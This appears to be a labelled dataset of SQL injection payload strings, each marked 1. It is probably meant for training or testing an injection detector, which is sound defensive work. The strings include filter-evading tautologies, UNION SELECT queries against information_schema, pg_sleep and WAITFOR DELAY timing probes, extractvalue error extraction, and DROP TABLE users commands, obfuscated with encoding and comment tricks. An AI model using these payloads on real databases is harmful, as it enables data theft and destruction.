"test%u0027%u0020OR%u0020%u00271%u0027%3D%u00271%u0027%u0020/*", 1
"1AnD1>=1%0d%0a", 1
"test%u0027%4fR%0a%u00271%u0027=%u00271%u0027", 1
"--/*%%30%64%0a*/", 1
"--%0d%0a", 1
"--s8oqmfw", 1
";/*!*/DROP TABLE users; --", 1
"#dyuoxkwjzihi2th", 1
";/**/DROP	TABLE	users;	--", 1
"%u0027AND", 1
"#c57zx1ec3f", 1
"--", 1
"1%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020AND%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u00201%u0020=%u0020%u00201", 1
"%u0027%u0020OR%u0020%u00271%u0027>=%u00271", 1
"tes%74%u0027OR", 1
"test%u0027%u0020OR%u0020%u00271%u0027	%3D%20%u00271%u0027%u0020/*", 1
"test%u0027OR", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"--", 1
"#07xp55jkrmq", 1
"test%u0027OR", 1
";/*!12345*/ DROP  TABLE  users;  --", 1
";DROP%20TABLE%20users;", 1
"'oR1=1", 1
"%2d-", 1
"--%0%61", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/*%u0020OR%u0020(1)", 1
"1'/**//**//**//**//**//**//**//**/UNION/**//**//**//**//**//**//**//**/SELECT/**//**//**//**//**//**//**//**/table_name,/**//**//**//**//**//**//**//**/null,/**//**//**//**//**//**//**//**/null/**//**//**//**//**//**//**//**/FROM/**//**//**//**//**//**//**//**/information_schema.tables/**//**//**//**//**//**//**//**/--", 1
"; SELECT pg_sleep(%35);%20%2d-", 1
"--97xq8j89", 1
"ADmIN%u0027%u0020OR%u0020%u0027%31%u0027%3d%u00271-%2dTZz04F", 1
"1", 1
"1%u0020aND%u00201=1", 1
"; %44ROP%20TABLE users; %2d-", 1
"; D%52OP T%41BLE users; %2d-", 1
"/*%%30d%0a*/", 1
"--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027	=%09%u00271", 1
";/**/DROP TABLE users; --#mlzcfwfu7th", 1
"--", 1
"%u0027UNION", 1
"WAITFORDELAY", 1
"; DROP T%41BLE use%72s; %2d-", 1
"--%0a", 1
"WAITFORDELAY", 1
";/*!12345*/DROP	TABLE	users;	--", 1
"ADmIN%U0027%U0020OR%u0020%u00271%u0027%09= %u00271", 1
"1)uNIonSElecT", 1
";/*!12345*/DROP TABLE users;  # more_noise--", 1
"1))UNIONSELECT", 1
"WAITFORDELAY", 1
"'and1=1", 1
"--%0a/*%0d%0a*/", 1
"-- RAndOm_noiSE--", 1
";%2f*!12345*/DRop%u0020%74AbL%65%U0020uSers;%u%30020%2d-", 1
"; SELEC%54 pg_sleep%285); %2d-", 1
"1%u0020AND%u00201>=1", 1
"'/*!12345*//**//**//**//**//**//**//**//**//**/OR/**//**//**//**//**//**//**//**//**//**/1	=	1/**//**//**//**//**//**//**//**//**//**/--/**//**//**//**//**//**//**//**//**//**/", 1
"admin%u0027%u0020%u0020OR%u0020%u0020%u00271%u0027%09%3D%u0020%u0020%u00271", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3E%3D%25u00271%25u0027%25u0020%2F%2A", 1
"%u0027%u0020oR%u0020%u00271%u0027=%u00271", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"%u0027AND", 1
"te%73t%u0027%u0020%4fR%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"--q3gw3w", 1
"'XOR", 1
"extractvalue(1,concat(0x5c,version()))--/*%0d%0a*/", 1
"#kixsfyade6", 1
"WAITFORDELAY", 1
";/*!*/DROP  TABLE  users;  --", 1
"--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027%3D%u00271", 1
"WAITFOR %44ELAY '0:%30:5'%2d-", 1
"; SELECT p%67_s%6ceep(5); %2d-", 1
"1 A%4eD 1=1", 1
"test%25U0027%25U0020Or%25U0020%25U00271%25u0027%3d%25u00271%25U0027%25U0020%2f%2a", 1
"WaiTFOR/**//**//**//**/dElAY/**//**//**//**/'0:0:5'----WR9qguS2", 1
"1%u0020%41ND%u00201=1", 1
"%u0027OR", 1
";/**/  DROP   TABLE   users;   --", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0020OR%u0020(1)", 1
"'oREX%49STS(sE%4cect", 1
"admin%u0027%u0020%u0020OR%u0020%u0020%u00271%u0027%09=%u0020%u00271", 1
"admin%u0027%u0020OR%u0020%u00271%u0027<=%u00271", 1
"test%u0027%u0020OR%u0020%u00271%u0027  =	%u00271%u0027%u0020/*", 1
"WAIT%46ORDELAY", 1
"test%u0027%u0020OR%u0020%u00271%u0027>%09= %u00271%u0027%u0020/*", 1
"1%27XORascii%28sub%73tring%28databa%73e(),1,1))%0d%0a%3E/%2a%0a*/100%0d%0a-%2d", 1
"test%u0027			OR			%u00271%u0027%20=	%u00271%u0027			/*", 1
"--", 1
"100", 1
"--%0a", 1
"TEst%U0027%u0020%u0020%U0020%u0020%U0020%u0020Or%U0020%u0020%u0020%U0020%u0020%U0020%U00271%U0027%U0020=%20%U00271%u0027%U0020%u0020%U0020%u0020%u0020%U0020/* oR (1)", 1
";%20DROP%20TA%42LE%%320users;%20%2d-", 1
"ADmin%25u0027%25u0020or%25U0020%25U00271%25U0027%3D%25u00271", 1
"/*%0a*/", 1
"test%u0027%u0020%u0020%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020%u0020%u0020%u00271%u0027	=	%u00271%u0027%u0020%u0020%u0020%u0020%u0020%u0020/*%u0020%u0020%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020%u0020%u0020%u0027b%u0027	=	%u0027b%u0027", 1
"-- random_noise", 1
"--/*%0a*/", 1
"'/**//**//**//**//**//**/Or/**//**//**//**//**//**/EXISts(SELeCt/**//**//**//**//**//**/1/**//**//**//**//**//**/FROM/**//**//**//**//**//**/USErs)----mLhTvGHvx3gI", 1
"--%0d%0A%0A", 1
"'anD1=1", 1
"--/*%0d%0a*/", 1
";%09%09%0%39SEL%45CT%09%09%09pg%5fsleep(5);%09%09%09-%2d", 1
";/%2a!*/DROPTABLE", 1
"users%3b%0a%2d-", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"#hsspdmm", 1
"%u0027%U0020OR%u0020%u00271%u0027=%U00271", 1
"test%27%u0020%4fR%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"--", 1
"test%u0027			OR			%u00271%u0027%u0020%u0020=%20%u00271%u0027			/*", 1
"%u0027OR", 1
"WAITFOR %44ELAY '%30:0:5'%2d-", 1
"--random_noise--/*%0a*/--io6tpio", 1
"waitFOrdelaY", 1
"--4u9ncthpw63vk", 1
"'UNIONSELECT", 1
"1%U0020AnD%u00201=1", 1
"1AND1%3D1%250d%250a", 1
"--#3geddjn7z", 1
"extractvalue(1,concat(0x5c,version()))--%0d%0a", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/* OR 'b'='b'", 1
"test%u0027%u0020%u0020%u0020OR%u0020%u0020%u0020%u00271%u0027%u0020=%u0020%u00271%u0027%u0020%u0020%u0020/*", 1
"--random_noise--/*%0a*/", 1
";DRO%50%0d%0aTAB%4cEusers;", 1
"-%2d", 1
"%31' UNIO%4e SEL%45CT table_name, null, n%75ll FR%4fM information_sche%6da.tab%6ces %2d-", 1
"#c63kyjquzzb", 1
"1))UNIONSELECT", 1
"%u0027%u0020or%u0020%u00271%u0027LIKE%u00271", 1
"/*/*%0a*/", 1
"; DROP %54ABLE us%65rs; %2d-%23wblo5vzuqhcizx", 1
"--talzprz42fcot", 1
"%u0027%u0020OR%u0020%u00271%u0027 = %u00271", 1
"%u0027%u0020%u0020%u0020%u0020%u0020%u0020oR%u0020%u0020%u0020%u0020%u0020%u0020%u00271%u0027%u0020%u0020=%20%u00271", 1
"--/*%0a*/--emdu3mdbmfyiwp", 1
";D%52OP", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0020OR%u0020%u0027b%u0027=%u0027b%u0027", 1
"'UNIONSELECT", 1
"1))UNIONSELECT", 1
"--", 1
"WAITFORDELAY", 1
"--", 1
";DROP%0d%0aTABL%45users;", 1
"1%u0020AND%u00201<=1", 1
"1%27/**//**//**//**//**//**/UNION/**//**//**//**//**//**/SELECT/**//**//**//**//**//**/table_name,/**//**//**//**//**//**/null,/**//**//**//**//**//**/null/**//**//**//**//**//**/FROM/**//**//**//**//**//**/information_schema.tables/**//**//**//**//**//**/----7mq10vtjgkamf", 1
"%u0027UNION", 1
"#o73d15", 1
"1)UNIONSELECT", 1
";dRop/*%0d%0a*/taBLe/*%0D%0a*/USErS;", 1
"--", 1
"1A%4eD", 1
";%20SE%4cECT%20pg_sleep%285);%20%2d-", 1
"%u0027%u0020XOR%u0020%u00271%u0027=%u00271", 1
"1AND1	=  1", 1
"--/*%0A*/", 1
"test%u0027%u0020OR%u0020%u00271%u0027%20=  %u00271%u0027%u0020/*", 1
"SELECTtable_name,null,nullFROMinformation_schema.tables", 1
"--", 1
"--", 1
"--%0a#96oag5wmk", 1
"' a%4Ed 1=1 %2D-", 1
"'/**//**//**//**//**//**//**//**/AND/**//**//**//**//**//**//**//**/extractvalue(1,concat(0x5c,version()))--", 1
"%u0027/*!*%2fAND%u00201>=conve%72t(int,@@version%29-%2d", 1
"--", 1
"'/**//**//**//**//**//**//**//**//**//**/AND/**//**//**//**//**//**//**//**//**//**/1/**//**/=	1/**//**//**//**//**//**//**//**//**//**/--/**//**//**//**//**//**//**//**//**//**/", 1
"1%u0020AND%u00201=1%u0020OR%u0020%u0027b%u0027=%u0027b%u0027", 1
"1))UN/*!%2a/ION", 1
";%2f**/DROP T%41BLE users; %2d-", 1
";DROP%0aTABLE", 1
"1%u0020aND%U00201=1", 1
";/*!*/   DROP    TABLE    users;    --", 1
"'oR1=1", 1
"--#tee6iq", 1
"--", 1
"%u0027%u0020OR%u0020%u00271%u0027  = %u00271", 1
"1)UN%49O%4e", 1
"test%25u0027%2F%2A%2A%2FOR%25u0020%25u00271%25u0027%3C%3D%25u00271%25u0027%25u0020%2F%2A", 1
"--otvu1bjnrp3pc", 1
"--%0a", 1
"--084kbmep3yoqo", 1
"--", 1
"1%u0020AnD%u00201=1", 1
";%u0020SEL%45CT%u0020pg_sleep%285);%u0020-%2d", 1
";/*!*/ DROP  TABLE  users;  --", 1
"--", 1
"1)UNIONSELECT", 1
"--", 1
"--%0d%0a", 1
"test%u0027%u0020%4fR%u0020%u00271%u0027=%271%u0027%u0020%2d-%u0020", 1
"--", 1
"WAITFORDELAY", 1
";/*!*/DROP				TABLE				users;				--", 1
"WAITFOR/**//**//**//**/DELAY/**//**//**//**/'0:0:5'--", 1
";/*!12345*/DROP TABLE users;  -- random_noise--#lmpxl6s7", 1
";  SELECT  %70g%5fsleep(5);  %2d-", 1
";SEL%45CT%0d%0apg_sl%65ep(5);-%2d", 1
"AdMin%u0027%u0020Or%u0020%U00271%U0027=%U00271", 1
"--", 1
"%74est%u0027%u0020OR%u0020%u00271%27=%u00271%u0027%u0020%2d-%u0020", 1
"%u0027%u0020or%u0020%u00271%u0027=%u00271", 1
"1) %55nion S%65lect 1,datA%62asE(),3-%2d", 1
"; %73eleCT PG_sLE%45p(5); -%2d", 1
"WAITFORDELAY", 1
